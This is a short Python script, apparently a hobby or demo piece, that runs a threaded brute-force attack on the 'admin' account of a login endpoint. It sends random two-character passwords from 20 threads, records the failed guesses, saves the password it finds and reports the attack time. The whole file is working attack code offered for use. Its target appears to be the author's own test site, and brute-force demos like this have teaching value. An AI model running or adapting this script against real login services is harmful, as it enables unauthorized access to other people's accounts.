import requests
import random
import os
from threading import Thread
from time import time, sleep

url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
usr = "admin"
Realpassword = None

def send_request(username, password):
    data = {"username": username, "password": password}
    r = requests.get(url, data=data)
    # print(r.text)
    return r

char = "abcdefghijklmnopqrstuvwxyz0123456789"

def main():
    global Realpassword
    while True:
        if "correctpass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            randpass = random.choices(char, k=2)
            passwrd = "".join(randpass)
            file = open("tries.txt",'r')
            tries = file.read()
            file.close()
            if passwrd in tries:
                pass
            else:
                valid = True

        r = send_request(usr, passwrd)

        if "failed to login" in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{passwrd}\n")
                f.close()
            # print("Incorrect")
        else:
            with open("correctpass.txt", "a") as f:
                f.write(f"{passwrd}\n")
                f.close()
                Realpassword = passwrd
            # print("Correct")

start = time()
for x in range(20):
    Thread(target=main).start()

while True:
    if "correctpass.txt" in os.listdir():
        end = time()
        break
    else:
        sleep(0.01)

timer = end - start

with open("time.txt", "a") as f:
    f.write(f"{timer}\n")
    f.close()

sleep(10)
print("Attack Time: "+str(timer))            
print("Password: " + str(Realpassword))            
